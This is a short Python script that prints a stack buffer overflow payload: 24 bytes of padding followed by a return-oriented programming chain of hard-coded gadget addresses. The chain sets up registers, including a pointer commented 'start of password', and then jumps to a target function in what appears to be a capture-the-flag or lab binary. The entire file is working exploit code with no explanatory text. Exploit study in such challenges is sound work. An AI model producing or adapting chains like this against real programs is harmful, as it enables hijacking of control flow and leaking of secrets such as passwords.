#!/usr/bin/env python3

import sys
sys.stdout.buffer.write(b"\x41" * 24)
#pop rdi; ret
sys.stdout.buffer.write(0x000000000040205f.to_bytes(8, "little"))
#start of password
sys.stdout.buffer.write(0x499040.to_bytes(8, "little"))
#pop rsi; ret
sys.stdout.buffer.write(0x000000000040a0ce.to_bytes(8, "little"))
sys.stdout.buffer.write(0xA.to_bytes(8, "little"))
#pop rdx; pop rbx; ret
sys.stdout.buffer.write(0x000000000047fbeb.to_bytes(8, "little"))
sys.stdout.buffer.write(0x1.to_bytes(8, "little"))
sys.stdout.buffer.write(0x0.to_bytes(8, "little"))
#target
sys.stdout.buffer.write(0x00000000004018d8.to_bytes(8, "little"))